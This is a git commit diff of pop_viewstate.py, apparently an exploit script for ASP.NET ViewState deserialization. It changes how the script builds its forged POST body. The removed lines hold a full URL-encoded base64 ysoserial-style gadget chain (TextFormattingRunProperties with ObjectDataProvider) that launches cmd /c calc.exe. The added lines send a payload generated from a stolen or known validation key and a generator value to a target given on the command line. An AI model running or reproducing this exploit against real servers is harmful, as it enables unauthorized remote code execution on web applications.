1fb92e598e68e3694b5531e17e4ea36e62930350
gwillgues <96144967+gwillgues@users.noreply.github.com>
2026-05-27 18:49:02 -0400

    Change pull_viewstate to pop_viewstate, add ysoserial code

--- pop_viewstate.py
+++ pop_viewstate.py
@@ -4,6 +4,7 @@ import re
 import base64
 import sys
 import subprocess
+import urllib
 
 target = sys.argv[1]
 
@@ -45,10 +46,9 @@ def gen_payload(validation_key, generator):
 
 
 def send_payload(target, payload, generator):
-#    post_body = f"__VIEWSTATE={payload}&__VIEWSTATEGENERATOR={generator}&__EVENTVALIDATION=%2FwEdAAPnl6wVKHtwLP1RW89DHL5MsiEMikfqxcx1nOQxwn%2BULjzmltaUM7aEAN%2Bg9cP%2Fm12iU74N73opqX8Vr4w5q4Cdrd7F4A%3D%3D&txtInput=hello&btnSubmit=Submit"
 
-    post_body = "__VIEWSTATE=%2FwEyoQcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADDBTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgJnF1b3Q7Y2FsYy5leGUmcXVvdDsiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M%2BDQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI%2BC9gakR9AxCTKRjxKVb0NJVIwyjN%2F&__VIEWSTATEGENERATOR=75BBA7D6&txtInput=hello&btnSubmit=Submit"
-#    print(post_body)
+    post_body = f"__VIEWSTATE={payload}&__VIEWSTATEGENERATOR={generator}&__EVENTVALIDATION=%2FwEdAAPnl6wVKHtwLP1RW89DHL5MsiEMikfqxcx1nOQxwn%2BULjzmltaUM7aEAN%2Bg9cP%2Fm12iU74N73opqX8Vr4w5q4Cdrd7F4A%3D%3D&txtInput=hello&btnSubmit=Submit"
+
     headers = {"User-Agent": "Mozilla/5.0",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded"
